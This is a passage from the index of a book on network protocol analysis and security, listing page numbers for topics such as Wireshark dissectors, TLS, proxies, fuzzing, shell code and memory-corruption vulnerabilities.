2, 6–7 destination network address translation\nvariable-length, 56 (DNAT), 24, 68–71\nData Encryption Standard (DES), DHCP. See Dynamic Host\n150–151 Configuration Protocol\ndata execution prevention (DEP), (DHCP)\n267–268 Diffie, Whitfield, 162\n296 Index\nDiffie–Hellman Key Exchange (DH), EIP register, 116–117, 135\n162–164 Electronic Frontier Foundation, 151\nDigital Signature Algorithm (DSA), 165 elements (XML), 58\ndisassembly, 113 ELF (Executable Linking Format), 120,\ndiscover (DHCP packet), 71 131, 144\ndissector() function, 99 Elliptic Curve Diffie–Hellman\ndissector.lua file, 98 (ECDH), 202\ndissectors elliptic curves, 160\ncreating, 97 encoding\nLua, 99 Base64, 60–61\nmessage packet parsing, 100–103 binary data, 59–61\nWireshark, 95–103 hex, 59–60\nDistinguished Encoding Rules percent, 60\n(DER), 53 encoding layer, 8–10\nDLL extension, 80, 120, 189 encryption, 20, 30. See also decryption\nDNAT (destination network address AES, 133, 150, 152\ntranslation), 24, 68–71 asymmetric, 160\nDNSMasq, 287 block cipher, 150\ndnsspoof, 34 breakpoints, 137\nDomain Name System (DNS) cipher block chaining, 153–155\nprotocol, 3 DES, 150–151\nDotfuscator, 143–144 Electronic Code Book, 153\ndotnet binary, 81 HTTP connection to, 108\ndowngrade attack, 176 key, 146\nDSA (Digital Signature Algorithm), 165 libraries, 132\nDS register, 116, 118 magic constants, 133\ndSYM (debugging symbols one-time pad, 148\npackage), 131 padding, 155\nDtrace, 16–18 public key. See asymmetric key\nDynamic Host Configuration Protocol cryptography\n(DHCP), 63, 66 RSA, 155, 161\npackets, 71–72 substitution ciphers, 147\nspoofing, 71–74 TLS, 175–176, 200–206\ndynamic libraries, 130, 195–196 Triple DES, 151\ndynamic linking, 113–114, 121 XOR, 108–109, 148–149, 153–154\ndynamic reverse engineering encryption libraries, 132\nbreakpoints, 135, 137 endianness, 41–42\ndefined, 134 errno, 262\ngeneral purpose registers, 136 errors\ncodes, 262\ndetecting and correcting, 2\nE\noff-by-one, 213\nEAX register, 116, 123, 242, 258, 270 verbose, 221–222\nEBP register, 116–117, 124 ES register, 116, 118\nEBX register, 116, 124 ESI register, 116, 124\nECDH (Elliptic Curve Diffie– ESP register, 116–117, 124, 136, 270\nHellman), 202 eth0, 180\nECX register, 116, 124 Ethernet, 3\nEDI register, 116–117, 124 ARP poisoning, 74–75\nEDX register, 116, 123–124 frame, 6, 8\nEFAULT, 262 MAC addresses, 6, 74\nEFLAGS register, 117, 119, 136 network routing, 7–8\nIndex 297\nEthernet (continued) redirecting traffic to, 30–31\npassive network capture, 12–13 simple implementation of, 30–31\nsimple network, 6 fragmentation, 51–52\nEttercap, 72–75, 287–288 FreeBSD, 16\nexecutable codes FreeCAP, 27\naddress space layout free-list, 251\nrandomization, 272 frequency analysis, 147\nfile formats, 119–120 FS register, 116, 118\nfunction calls in, 123 FTP (File Transfer Protocol), 24, 28\nmemory corruption and, 210, 246 function monitors, 111\npartial overwrites, 272 fuzz testing\nrepurposing, 188–199 defined, 234\nin .NET applications, 189–193 mutation fuzzer, 235\nin Java applications, 193–195 simplest, 234\nROP gadgets, 269 test cases, 235–236\nsystem calls, 259 tools\nunmanaged, 195–199 American Fuzzy Lop, 285–286\nexecutable file formats, 119–120, 137 Kali Linux, 286\nExecutable Linking Format (ELF), 120, Metasploit, 286\n131, 144 Scapy, 287\n.exe extension, 120, 137–138, 189 Sulley, 287\nexit system call, 260–261\nExtensible Markup Language\nG\n(XML), 58\nExtensible Messaging and Presence Galois Counter Mode (GCM), 155\nProtocol (XMPP), 58 gateway\nconfiguring, 66–67\nARP poisoning, 74–77\nF\nDHCP spoofing, 71–74\nfalse, 55 default, 8, 66\nfd argument, 261 forwarding traffic to, 71–77\nFederal Information Processing hops, 65\nStandard (FIPS), 151 nodes, 64\nFeistel network, 151 routing tables on, 65–66\nFile Transfer Protocol (FTP), 24, 28 GB2312, 44\nFILETIME (Windows), 50 GCC compiler, 196\nFinancial Information Exchange (FIX) GCM (Galois Counter Mode), 155\nprotocol, 56 GDB (debugger), 236–241\nfinished packet, 176 General Public License, 14\nfixed-length buffer overflows, 211–213 general purpose registers, 116–117, 136\nfloating-point data, 40–41 GET request, 8, 29\nFollow Stream button (Wireshark), 85 GetConstructor method (.NET), 191\nFollow TCP Stream view (Wireshark), getDeclaredConstructor() (Java), 195\n88–89 GetMethod() method (.NET), 192–193\nfooters, 4–5 Google, 170, 176–177\nformat string vulnerability, 227 GS register, 116, 118\nforward slash (/), 81, 220 guard pages, 245\nforwarding HTTP proxy. See also GUI registry editor, 67\nreverse HTTP proxy GVSP protocol, 182\nadvantages and disadvantages of, 31 gzip, 217\n298 Index\nH I\nhandshake, 172 IBM, 151\nhardcoded credentials, 218 ICS (Internet Connection Sharing), 69\nhash table, 225 IDA Pro, 289\nhashed message authentication codes analyzing stack variables and\n(HMAC), 168–169 arguments in, 128\nhashing algorithms analyzing strings in, 132\ncollision resistance, 164 debugger windows, 135–136\ncryptographic, 164–165 EIP window, 135\nnonlinearity of, 164 ESP window, 136\npre-image resistance, 164 disassembly window, 127–128\nsecure, 164–165, 202 extracting symbolic information in,\nSHA-1, 133, 165–166 129–131\nSHA-2, 165 free version, 125–128\nSHA-3, 168 graph view, 126\nHEAD, 29 identifying automated code in,\nHeader, , 4–5 133–134\nC, 17, 262 Imports window, 131–132\nEthernet, 6 main interface, 127\nHTTP, 24, 32–34 viewing imported libraries in,\nIP, 6 131–132\nsystem call number, 260 windows, 126–127\nTCP, 5, 87 IEEE format, 40–41\nUDP, 5 IEEE Standard for Floating-Point\nheap buffer overflows, 248–249 Arithmetic (IEEE 754), 40\nheap implementations, 250–251 ILSpy, 138, 290\nheap memory storage, 253 analyzing type in, 140–141\nHellman, Martin, 162 main interface, 139\nHex Dump (Wireshark), 86–95 Search window, 139\ndetermining protocol structure in, implicit-length data, 48–49\n88–89 in-band method, 253\ninformation columns in, 87 inbound bytes, 89–92\nviewing individual packets in, 87 inbound data, 92\nhex editor, 125 INC instruction, 115\nhex encoding, 59–60 incorrect resource access, 220–223\nHex Rays, 125 canonicalization, 220–221\nhigh privileges, 254–255 verbose errors, 221–222\nHMAC (hashed message authentication inet_pton, 122–123\ncodes), 168–169 information disclosure, 209\nHopper, 289–290 initialization vector, 154\nhops, 65 inner padding block, 168\nhost header, 24, 32–33 instruction set architecture (ISA),\nhost order, 42 114–116\nhosts file, 23, 34 integer overflows, 214–215\nHping, 282 integers\nHTTP (HyperText Transport Protocol), signed, 39\n3, 56 text protocols, 55\nhost header, 24 unsigned, 38\nnetwork protocol analysis, 8–10 variable-length, 39–40\nproxies. See also protocols Intel, 114\nforwarding, 29–31 Intel syntax, 116\nreverse, 32–35 Internet Connection Sharing (ICS), 69\nIndex 299\nInternet layer, 3 K\nInternet Protocol (IP), 2\nKali Linux, 286\nInternet Protocol Suite (IPS)\nkernel mode, 14\ndata encapsulation, 4–7\nkey-scheduling algorithm, 151\ndata transmission, 6–7\nKorean characters, 44\ndefined, 3\nKrypto Analyzer, 134\nlayers, 3\nnetwork routing, 7–8\ninterpreted languages, 112 L\ninterpreters, 112\nleast significant bit (LSB), 38\nInvoke() method (.NET), 192–193\nlength-extension attacks, 166–168\nIP (Internet Protocol), 2\nlength-prefixed data, 48\nIP address\nlengths, 107\n32-bit, 24\nLibPCAP, 278–279\nARP poisoning, 74–77\nline feed, 56\ndata transmission, 6–7\nline oriented protocols, 56\ndestination, 18, 22\nlinking, 113–114\nDNAT, 69–71\nlink layer, 3, 6\nDNS spoofing, 34\nLinux, 120\nhosts file, 34\nASLR implementation flaws in, 272\nNAT, 68\nconfiguring SNAT on, 69\nnetwork routing, 7–8\ncron jobs, 254\nreverse shell, 266\ndebug symbols, 129\nSNAT, 68\ndebugger, 236–241\nSOCKS connection, 25\ndynamic libraries, 196\nipconfig command, 69\nenabling routing on, 67\niptables command, 69\nerror codes, 262\nIPS. See Internet Protocol Suite (IPS)\nexecutable file format, 131\nIPv4, 3, 5, 24, 52, 122\nloading library on, 197\nIPv6, 3, 5–6, 25, 52, 67\nSOCKS proxy, 27\nISA (instruction set architecture),\nstrace, 16\n114–116\nlittle endian, 42, 122\nLLDB (debugger), 236–241\nJ Load() method (.NET), 190\nLoadFrom() method (.NET), 190\nJapanese characters, 44\nlocal variables, corrupting, 274–275\nJava, 112, 210\nlocalhost, 12\napplications, 141–142\nlow-privileged file writes, 255\nreflection types, 194\nLua, 95–103\nrepurposing codes in, 193–195\nJava archive (JAR), 141, 193–194\nJava byte code, 137 M\nJava Decompiler, 288\nMAC (Media Access Control)\nJava Runtime, 27\naddresses, 6–7, 8, 74–77\nJavaScript, 252\nmachine code, 112–114, 120, 125\nJavaScript Object Notation (JSON),\nmacOS, 16, 27–28, 120\n57–58\ndebug symbols, 129\nJava TCP client, 27\ndebugger, 236–241\nJcc instruction, 115\ndynamic libraries, 196\nJD-GUI, 142\nenabling routing on, 67\nJMP instruction, 115, 119\nMach-O format, 120, 131, 144\n300 Index\nMACs. See message authentication off-by-one error, 213\ncodes (MACs) out-of-bounds buffer indexing,\nmagic constants, 132 216–217\nmail application, 3 memory exhaustion attacks, 222–223\nmain thread, 121 memory index registers, 117\nMallory, 281–282 memory sections, 120\nmalware, 23 memory-safe languages, 210\nman 2 syscall_name command, 16 memory-unsafe languages, 210\nmanaged languages Message Analyzer, 278\nJava, 141–142 message authentication codes (MACs)\n.NET applications, 137–141 collision attacks, 166–168\nreverse engineering, 137–144 hashed, 168–169\nman-in-the-middle proxy, 20, 201 length-extension attacks, 166–168\nmasquerading, 68 signature algorithms, 166–168\nmaster secret (TLS), 175 Message command, 101–102\nMD algorithm. See message digest message digest (MD) algorithm, 164\n(MD) algorithm MD4, 165\nMedia Access Control (MAC) MD5, 133, 165–167\naddresses, 6–7, 8, 74–77 message packet, 100–103\nmemory Metasploit, 286\narbitrary writing of, 253–254 accessing payloads, 265\nheap memory storage, 253 advantages and disadvantages of,\ninformation disclosure 265–266\nvulnerabilities, 270–271 executing payloads, 266\nwasted, 250 generating shell code with,\nmemory canaries (cookies) 265–266\nbypassing by corrupting local MethodInfo type (.NET), 192\nvariables, 274–275 Microsoft, 170\nbypassing with stack buffer Microsoft Message Analyzer, 278\nunderflow, 275–276 MIME (Multipurpose Internet Mail\ndetecting stack overflows with, Extensions), 56–57\n273–276 minus sign (-), 55\nmemory corruption. See also MIPS, 42, 137\nvulnerabilities Mitmproxy, 284–285\nbuffer overflows, 210–215 mnemonic instruction, 114\ndata expansion attack, 217 modulo arithmetic, 214\ndynamic memory allocation modulus, 161, 214\nfailures, 217 mono binary, 80\nexploit mitigations, 266–276 Mono Project, 137\naddress space layout most significant bit (MSB), 38\nrandomization, 270–273 MOV instruction, 115\ndata execution prevention, Mozilla Firefox, 26\n266–267 MSCORLIB, 141\nreturn-oriented programming, MS-DOS, 119\n268–270 msfvenom tool, 265–266\nexploiting, 245–253 multibyte character sets, 44\nheap buffer overflows, 248–249 multiplexing, 51–52\nstack buffer overflows, 246–248 Multipurpose Internet Mail Extensions\nmemory-safe vs. memory-unsafe (MIME), 56–57\nlanguages, 210 multitasking, 120\nIndex 301\nN newInstance() method (Java), 195\nNmap, 282–283\nnamespace, 193\nNNTP (Network News Transfer\nname-value pairs (XML), 58\nProtocol), 59\nnasm assembler, 256, 258, 263\nnodes, 1\nNAT. See network address\ngateway, 64\ntranslation (NAT)\nidentifying through addressing, 2\n.NET applications\nno-execute (NX) mitigation, 267\nbase class library, 141\nnonlinearity, 165\nfile formats, 137–138\nnonpersistent denial-of-service, 208\nILSpy, 138–141\nNULL, 263–264\nreflection binding types, 192\nnumeric data\nreflection types, 190\ndecimal numbers, 55\nrepurposing codes in, 189–193\nfloating-point data, 40–41\nrepurposing executable codes in\nintegers, 55\nassembly loading, 190–193\nsigned integers, 39\nusing Reflection APIs, 190\ntext protocols, 55\n.NET Core, 80\nunsigned integers, 38\n.NET Reflector, 290–291\nvariable-length integers, 39–40\nNetcat, 180–182, 234, 282\nNX (no-execute) mitigation, 267\nNetClientTemplate class, 184–185\nnetstat -r command, 65\nNetwide Assembler, 256 O\nnetwork, 1\nOAEP (Optimal Asymmetric\nconnectivity and protocol testing\nEncryption Padding), 162\ntools\nobfuscation, 143–144\nHping, 282\noctets, 38–40\nNetcat, 282\noctet-stream, 57\nNmap, 282–283\noff-by-one error, 213\nmonitoring connections with\noffer (DHCP packet), 71\nDTrace, 16–18\none-time pad encryption, 148\nproxies, 20–35\nopen system call, 18\nrouting, 7–8\nOpenSSL, 132\nnetwork address, 7, 20, 22, 52–53, 66,\noperands, 115\n71, 123\noperating system\nnetwork address translation (NAT),\napplication binary interface,\n68–71\n123–124\ndefined, 68\nexecutable file formats, 119–120\ndestination, 24, 68\nnetworking interface, 121–124\nsource, 68–69\nprocesses, 120–121\nnetwork communication, 4\nsections, 120\nBerkeley Sockets model, 15\nthreads, 120–121\nlayers, 3\nOptimal Asymmetric Encryption\nman-in-the-middle attack on, 20\nPadding (OAEP), 162\nsymmetric ciphers, 150\nOR instruction, 115\nuser-to-kernel, 15\noutbound bytes, 89\nnetwork interface, 121–124\noutbound traffic, 89\nclient connection to TCP server, 122\nouter padding block, 168\nTCP client connection to server,\nout-of-band method, 253\n121–122\nout-of-bounds buffer indexing, 216–217\nNetwork News Transfer Protocol\noutput feedback mode, 159\n(NNTP), 59\noverflow flag, 117\nnetwork order, 42\n302 Index\nP path, 220\n$pc, 239\npackage-private scoped classes, 193\nPDB (program database) file, 129–131\npackets, 6\nPDP-11, 42\ncalculating checksum of, 93–94\nPDU (protocol data unit), 4\ncapturing, 83–84\nPE (Portable Executable) format, 120,\nfinding, 87–88\n134, 144\nidentifying structure with Hex\nPEiD, 134\nDump, 86–95\nPEM format, 202\nsniffing, 12–14\npercent encoding, 60\nviewing, 87–88\nperfect forward secrecy, 177\npacking tools, 134\npermutation boxes (P-Box), 152\npadded data, 49\npersistent denial-of-service, 208\npadding\nPGP (Pretty Good Privacy), 169\nblock ciphers, 155–156\nPHP, 255\ndecryption, 155–157\nPKI. See public key infrastructure (PKI)\nencryption, 155\nplain, 57\ninner block, 168\nplaintext, 146\nOAEP, 162\nplus sign (+), 54\noracle attack, 156–158\nPoint-to-Point Protocol (PPP), 3\nouter block, 168\nPOP3 (Post Office Protocol 3), 4\nRSA encryption, 155, 162\nPOP instruction, 115\nPage Heap, 244–245\nport, 2\nparity flag, 117\nport numbers, 5\nParser class, 106, 185\nPortable Executable (PE) format, 120,\nparser.csx script, 183–184\n134, 144\nparsing\nport-forwarding proxy. See also proxies\nbinary conversion and, 90\nadvantages and disadvantages of,\ndecimal numbers and, 55\n23–24\nendianness of data and, 41\nbinding to network addresses, 22\nHTTP header, 33\nredirecting traffic to, 22–23\nmessage command, 101–102\nsimple implementation of, 21–22\nmessage packet, 100–103\nPOSIX, 15\nmutation fuzzer and, 235\nPOSIX/Unix time, 50\nprotocol, 107–108\nPOST, 29\nPython script for, 91\nPost Office Protocol 3 (POP3), 4\ntraffic, 183\nPowerPC, 38\nURL, 230\nPPP (Point-to-Point Protocol), 3\nvariable-length integers, 40\nPractical Packet Analysis, 14\npartial overwrites, 272–273\npre-image resistance (hashing\npassive network capture\nalgorithm), 165\nadvantages and disadvantages of,\npre-master secret (TLS), 175\n19–20\nPretty Good Privacy (PGP), 169\nDtrace, 16–18\nprintable characters (ASCII), 43\npacket sniffing, 12–14\nprintf function, 227\nProcess Monitor tool, 17–18\nprivate Connect() method (.NET), 192\nstrace, 16\nprivate exponent, 161\nsystem call tracing, 14–16\nprivate key, 161, 165\ntools\nPRNGs (pseudorandom number\nLibPCAP, 278–279\ngenerators), 149\nMicrosoft Message Analyzer, 278\nProcess() method, 275–276\nTCPDump, 278–279\nProcess Monitor tool, 17–18\nWireshark, 12–13, 279–280\nIndex 303\nprocesses, 120–121 public key encryption. See asymmetric\nprocessor architectures, 42 key cryptography\nprogram database (PDB) file, 129–131 public key infrastructure (PKI),\nprogram flow, 118–119 169–172\nProGuard, 143–144 certificate chain verification,\npromiscuous mode, 12 170–172\nPROT_EXEC flag, 257 defined, 169\nprotocol data unit (PDU), 4 web of trust, 169\nprotocol stack, 3 X.509 certificates, 169–170\nprotocols PublicClass class, 189\nanalysis, 8–10, 105–106 PublicMethod() method, 189\nbinary, 38–49 PUSH instruction, 115\nchanging behavior of, 108–109 Python, 210\nchecksum, 93–94 binary conversions, 90–92\ndates, 49–50 calling functions with, 199\ndetermining structure of, 88–89 ctypes library, 195\nfragmentation, 51–52 data types, 198\nfunctions of, 2 dissecting protocol with, 90–95\nmultiplexing, 51–52 loading library with, 197\nnetwork address, 52–53 resending captured UDP traffic\nnetwork connectivity and protocol with, 182–183\ntesting struct library, 90–92\nHping, 282\nNetcat, 282\nQ\nNmap, 282–283\nparsing, 107–108 quoted string, 47–48\nsecurity, 145–178\nstructured binary formats, 53–54\nR\ntag, length, value (TLV) pattern,\n50–51 rand() function, 149\ntext, 54–58 random number generators, 149\ntimes, 49–50 RAX register, 257–260\nunknown parts, 93 RC4 stream cipher, 176\nproxies RDP (Remote Desktop Protocol), 51\nHTTP, 29–35 read system call, 15, 18, 122\nman-in-the-middle, 20 read_bytes() function, 91\nport-forwarding, 21–24 ReadData() function, 108\nprotocol analysis with, 105–106 ReadOutbound() function, 109\nsetting up, 103–105 Real Time Messaging Protocol\nSOCKS, 24–29, 103 (RTMP), 29\ntraffic analysis with, 103–110 Receive() method (.NET), 193\nProxifier, 27 recv system call, 15, 122–123\npseudo registers, 239 recvfrom system call, 15\npseudorandom number generators reflection, 189\n(PRNGs), 149 registers\npublic Connect() method (.NET), 192 control, 117\npublic exponent, 161 CS, 116, 118\npublic key, 160–161, 165 DS, 116, 118\nPublic Key Cryptography Standard EAX, 116, 123, 242, 258, 270\n#1.5, 162 EBP, 116–117, 124\nPublic Key Cryptography Standard #7 EBX, 116, 124\n(PKCS#7), 155–156 ECX, 116, 124\n304 Index\nEDI, 116–117, 124 Rijndael, 152\nEDX, 116, 123–124 Rivest, Ron, 160\nEFLAGS, 117, 119, 136 RMI (Remote Method Invocation), 29\nEIP, 116–117, 135 root certificate, 170\nES, 116, 118 ROP (return-oriented programming),\nESI, 116, 124 268–270\nESP, 116–117, 124, 136, 270 route print command (Windows), 65\nFS, 116, 118 router, 7–8\ngeneral purpose, 116–117, 136 ARP poisoning, 75–77\nGS, 116, 118 configuring, 66–67\nmemory index, 117 defined, 64\npseudo, 239 enabling DNAT, 70\nRAX, 257–260 enabling SNAT, 68–69\nscratch, 123 routing\nselector, 118 on Linux, 67\nSS, 116 on macOS, 67\nx86 architecture, 116–118 on Windows, 66\nremote code execution, 208 routing table, 8, 65–66\nRemote Desktop Protocol (RDP), 51 RPC (Remote Procedure Call), 22\nRemote Method Invocation (RMI), 29 RSA encryption, 149\nRemote Procedure Call (RPC), 22 algorithm, 160–162\nrequest (DHCP packet), 72 padding, 155, 162\nRequest for Comments (RFCs), 42, signature algorithm, 165\n56–57 RSS (Rich Site Summary), 58\nrequest line, 30 Ruby, 210\nrerouting traffic, 64–66 Run() function, 187\nRESP field, 25 runtime, 137\nRET instruction, 115\nRet2Libc, 269\nS\nRETN instruction, 115\nreturn-oriented programming (ROP), say_hello() method, 197\n268–270 say_string() method, 197\nreverse engineering say_struct() function, 199\ndynamic, 134–137 Scan for Hosts (Ettercap), 76\nmanaged languages, 137–144 Scapy, 287\nobfuscation, 143–144 scratch registers, 123\nresources, 144 scripting languages, 112\nstatic, 125–134 sections (memory), 120\ntools secure hashing algorithm (SHA), 164\nHopper, 289–290 SHA-1, 133, 165–166\nIDA Pro, 289 SHA-2, 165\nILSpy, 290 SHA-3, 168\nJava Decompiler, 288 Secure Sockets Layer (SSL).\n.NET Reflector, 290–291 See Transport Layer\nreverse HTTP proxy. See also Security (TLS)\nforwarding HTTP proxy security, 145–178\nadvantages and disadvantages of, 35 encryption, 146–149\nhost header, 32–33 public key infrastructure (PKI),\nredirecting traffic to, 34 169–172\nsimple implementation of, 33 random number generators, 149\nreverse shell, 266 requirements, 145–146\nRich Site Summary (RSS), 58 signature algorithms, 164–169\nIndex 305\nsecurity (continued) Simple Mail Transport Protocol\nsymmetric key cryptography, (SMTP), 3–4, 56, 59\n149–159 Simple Network Management Protocol\nTransport Layer Security, 172–177 (SNMP), 53\nsegment, 5, 87 sketches, 150\nSELECT statement, 229 sniffing, 12–14, 73\nselector registers, 118 sockaddr_in structure, 17, 122\nself-signed certificate, 170 socket system call, 15\nSend() method (.NET), 192–193 SOCKS proxy, 103. See also proxies\nsend system call, 15, 122–123 advantages and disadvantages of,\nsendfrom system call, 15 28–29\nSerpent, 152 Firefox proxy configuration, 26\nserver random (TLS), 173 Java TCP client, 27\nsession key, 162 overview, 24\nsession state, 2 redirecting traffic to, 26–27\nset detach-on-fork off command, 237 simple implementation of, 25–26\nsetAccessible() (Java), 195 versions, 24–25\nSGML (Standard Generalized Markup socksProxyHost system property, 27\nLanguage), 58 socksProxyPort system property, 27\nSHA. See secure hashing SOH (Start of Header), 56\nalgorithm (SHA) Solaris, 16, 120\nShamir, Adi, 160 source address, 5\nshared key, 163 source code, 112\nshell code source network address translation\naccessing payloads, 265 (SNAT)\ndebugging technique, 258–259 configuring on Linux, 69\ngenerating with Metasploit, 265–266 enabling, 68–69\nrelative address on 32- and 64-bit $sp, 239\nsystems, 263 SPARC architecture, 42, 118, 137\nreverse shell, 266 spoofing\nsetting breakpoint on, 258–259 DHCP, 71–74\nsystem calls, 259 DNS, 34\nexit, 260–261 tools, 287–288\nwrite, 261–263 sprintf string function, 212\nwriting, 255–266 SQL. See Structured Query\nshell_bind_tcp, 265 Language (SQL)\nShift-JIS, 44 SS register, 116\nSHL instruction, 115, 119 stack buffer overflows, 246–248,\nSHR instruction, 115 273–276\nsign flag, 117 stack buffer underflow, 275–276\nsignature algorithms, 146, 164–169 stack trace, 239–240\nasymmetric, 165 stack variables, 128\ncryptographic hashing algorithms, Standard Generalized Markup\n164–165 Language (SGML), 58\nDSA, 165 start address, 120\nmessage authentication codes, Start of Header (SOH), 56\n166–168 static linking, 113–114\nRSA, 165 static reverse engineering, 125–134. See\nsymmetric, 166 also reverse engineering\nsigned integers, 39 analyzing strings in, 133\nsimple checksum, 93–94 extracting symbolic information in,\n129–131\n306 Index\nidentifying key functionality in, system API, 268\n129–134 System assembly, 141\nstack variables and arguments, 128 system calls\nstdcall, 199 accept, 123\nstorage exhaustion attacks, 223–224 bind, 15\nstrace, 16 connect, 15\nstrcat string function, 212 exit, 260–261\nstrcpy string function, 212 open, 18\nstrcpy_s string function, 212 read, 15, 18, 122\nstream ciphers, 158–159. See also block recv, 15, 122–123\nciphers recvfrom, 15\nstrings, 42–46 send, 15, 122–123\nanalyzing, 132 sendfrom, 15\nASCII standard, 42–44 shell code, 259–262\nStrip tool, 131 socket, 15\nstruct library (Python), 90 tracing, 14–19\nStructure class, 199 Unix-like systems, 15–16, 122\nstructured binary formats, 53–54 write, 15, 18, 122, 261–263\nStructured Query Language (SQL) system function, 228\ninjection, 228–229 System.Activator class (.NET), 191\nServer, 229 System.Reflection.Assembly class\nstructured text formats, 56–58 (.NET), 190\nSUB instruction, 115 System.Reflection.ConstructorInfo class\nsubroutine calling, 118–119 (.NET), 190\nsubstitution boxes (S-Box), 152 System.Reflection.FieldInfo class\nsubstitution ciphers, 147 (.NET), 190\nsubstitution-permutation network, 152 System.Reflection.MethodInfo class\nSulley, 287 (.NET), 190\nSuperFunkyChat System.Reflection.PropertyInfo class\nanalysis proxy (.NET), 190\ncaptured traffic, 183–187 System.Type class (.NET), 190\nsimple network client, 184–186\nsimple server, 186–188\nT\nChatClient, 81, 83–84, 106, 200\nChatServer, 80, 106 tag, length, value (TLV) pattern,\ncommands, 81 50–51, 89, 94–95\ncommunicating between clients, 81 TCP. See Transmission Control\ndissectors, 95–103 Protocol (TCP)\nparser code for, 107 TCPDump, 278–279\nstarting clients, 80–81 TCP/IP, 2, 9–10, 121, 262\nstarting the server, 80 TCP/IP Guide, 16\nUDP mode, 97 TcpNetworkListener (ILSpy), 140\nswitch device, 6 terminated data, 47–48\nsymbolic information, 129–131 terminated text, 56\nsymmetric key cryptography, 149. TEST instruction, 115, 119\nSee also asymmetric key testy virtual buffer (TVB), 99\ncryptography text protocols, 54\nblock ciphers, 150–159 Booleans, 55\nstream ciphers, 158–159 dates, 55\nsymmetric signature algorithms, 166 numeric data, 55\nsynchronize flag (SYN), 41 structured text formats, 56–58\nIndex 307\ntext protocols (continued) traffic\ntimes, 55 analysis using proxy, 103\nvariable-length data, 55 capturing\ntext-encoding character replacement, active method, 20\n229–231 HTTP, 29–35\nthreads, 120–121 man-in-the-middle, 20\ntimes, 49–50, 55 passive method, 12–20\nTLS. See Transport Layer Security (TLS) port-forwarding, 21–24\nTLS Record protocol, 172 proxies, 20–35\nTLV (tag, length, value) pattern, SOCKS, 24–29\n50–51, 89, 94–95 system call tracing, 14–19\nToDataString() method, 186 capturing tools\ntoken, 56 Dtrace, 17–18\ntools Netcat, 180–182\nfor active network capture and Process Monitor tool, 18–19\nanalysis strace, 16\nCanape, 280–281 generating, 83–84\nCanape Core, 281 outbound, 89\nMallory, 281–282 Transmission Control Protocol (TCP),\nfuzz testing 2–3, 21\nAmerican Fuzzy Lop, 285–286 bit flags, 41\nKali Linux, 286 client connection to server, 121–123\nMetasploit, 286 header, 5, 87\nScapy, 286 HTTP proxy, 30\nSulley, 286 packets, 87–88\nnetwork connectivity and protocol port numbers, 5\ntesting port-forwarding proxy, 21–22, 201\nHping, 282 reading contents of sessions, 85–86\nNetcat, 282 reverse shell, 265–266\nNmap, 282–283 SOCKS proxy, 24–28\nfor network spoofing and stream, 13–14\nredirection transport layer, 3, 6, 8–10\nDNSMasq, 287 Transport Layer Security (TLS)\nEttercap, 287–288 certificate pinning, 177\nfor passive network capture and client certificate, 175\nanalysis decryption, 201–202\nLibPCAP, 278–279 encryption, 175–176, 200–201\nMicrosoft Message Analyzer, 278 endpoint authentication, 174–175\nTCPDump, 278–279 forcing TLS 1.2, 202\nreverse engineering handshake, 172–173\nHopper, 289–290 initial negotiation, 173\nIDA Pro, 289 perfect forward secrecy, 177\nILSpy, 290 replacing certificate in, 202–206\nJava Decompiler, 288 security requirements, 176–177\n.NET Reflector, 290–291 TLS Record protocol, 172\nfor web application testing trapdoor functions, 160\nBurp Suite, 283–284 Triple DES, 151\nMitmproxy, 284–285 true, 55\nZed Attack Proxy, 284 trusted root certification\ntraceconnect.d file, 16 authorities, 204\ntraceroute, 64–65 Tshark, 180–182\ntracert (Windows), 64–65 TVB (testy virtual buffer), 99\n308 Index\nTwofish, 152 user interface (UI), 4\ntwo’s complement, 39 user mode, 14\nuser-after-free vulnerability, 249–250\nUTF (Unicode Transformation\nU\nFormat), 44–45\nUCS (Universal Character Set), 44–45 UTF-8, 45–46\nUDP. See User Datagram\nProtocol (UDP)\nV\nUI (user interface), 4\nuname command, 263–264 variable binary length data\nUnicode implicit-length data, 48–49\ncharacter encoding, 44–45 length-prefixed data, 48\ncharacter mapping, 44–45 padded data, 49\nUCS-2/UTF-16, 45 terminated data, 47–48\nUCS-4/UTF-32, 45 variable-length buffer overflows, 211,\nUnicode Transformation Format 213–214\n(UTF), 44–45 variable-length data, 56\nUnified Sniffing mode (Ettercap), 76 variable-length integers, 39–40\nUniform Request Identifier (URI), verbose errors, 221–222\n30, 32 Verisign, 170\nuninitialized data, 120 virtual function table, 242, 248–249\nUniversal Character Set (UCS), 44–45 virtual hosts, 24\nUnix-like systems, 5 virtual machine, 137\nASLR implementation flaws in, 272 VirtualAlloc, 250\nAT&T syntax, 116 Visual C++, 129\ncommand injection, 228 vulnerabilities\ncommand line utilities on, 31 authentication checking, 226\nconfiguring DNAT on, 70 classes\nDtrace, 16 authentication bypass, 209\nenabling routing on, 67 authorization bypass, 209–210\nerror codes, 262 denial-of-service, 208\nexecutable format, 120 information disclosure, 209\nhosts file, 23 remote code execution, 208\nread and write calls, 122 command injection, 228\nrouting tables on, 65 CPU exhaustion attacks\nsystem calls, 15–16, 122 algorithmic complexity,\ntraceroute, 64 224–225\nUnk2 value, 93–95 configurable cryptography,\nunmanaged executables, 195–199 224–225\ndynamic libraries, 195–196 default or hardcoded\nunsafe keyword, 210 credentials, 218\nunsigned integers, 38 exploiting\nUPX, 134 arbitrary writing of memory,\nURI (Uniform Request Identifier), 253–254\n30, 32 defined memory pool\nUser Datagram Protocol (UDP), 3 allocations, 252–253\ncaptured traffic, 182–183 heap layout manipulation,\ndissectors, 98–99 249–250\npayload and header, 5 heap memory storage, 253\nport forwading, 21 high-privileged file writes,\nsocket, 122 254–256\nuser enumeration, 218–219 low-privileged file writes, 255\nIndex 309\nmemory corruption, 245–253 Winsock library, 121\nuser-after-free vulnerability, XP SP2, 270\n249–250 WinDump, 278\nformat string, 227 WinPcap, 278\nfuzz testing, 234–236 Winsock, 121\nincorrect resource access Wireshark, 12–14, 81, 279–280\ncanonicalization, 220–221 basic analysis, 84–85\nverbose errors, 221–222 capture interfaces dialog, 82–83\nmemory corruption Conversations window, 84–85\nbuffer overflows, 210–215 dissectors, 95–103\ndata expansion attack, 217 generating network traffic in,\ndynamic memory allocation 83–84\nfailures, 217 Hex Dump view, 86–95\nexploit mitigations, 267–268 main window, 82\nmemory-safe vs. memory-unsafe reading contents of TCP sessions\nlanguages, 210 in, 85–86\nout-of-bounds buffer indexing, Tshark command line version,\n216–217 180–182\nmemory exhaustion attacks, WOT (web of trust), 169\n222–223 write system call, 15, 18, 122, 261–263\nshell code, 255–266 WriteData() function, 108\nSQL injection, 228–229 WritePackets() method, 22\nstorage exhaustion attacks, ws2_32.dll Windows network library,\n223–224 130–131\ntext-encoding 